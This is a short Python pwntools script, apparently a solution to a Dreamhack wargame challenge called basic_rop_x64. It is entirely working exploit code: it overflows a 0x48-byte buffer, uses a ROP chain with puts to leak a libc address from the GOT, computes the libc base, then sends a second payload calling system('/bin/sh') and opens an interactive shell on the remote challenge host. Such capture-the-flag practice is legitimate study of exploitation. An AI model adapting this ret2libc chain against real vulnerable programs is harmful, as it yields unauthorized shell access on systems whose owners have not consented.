#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./basic_rop_x64_patched',checksec=False)
libc = ELF('./libc.so.6',checksec=False)

r=  remote('host2.dreamhack.games',9696)
# r = process(exe.path)
input()
pop_rdi = 0x0000000000400883
ret = 0x00000000004005a9

payload = b'A'*0x48
payload += p64(pop_rdi) + p64(exe.got['puts'])
payload += p64(exe.plt['puts']) + p64(exe.sym['main'])

r.send(payload)

r.recv(0x40)
leak = u64(r.recv(6) + b'\00\00')
libc.address= leak - libc.sym['puts']

log.info('Leak: ' + hex(leak))
log.info('Base; ' + hex(libc.address))

payload = b'A'*0x48
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(ret)
payload += p64(libc.sym['system'])

r.send(payload)
r.interactive()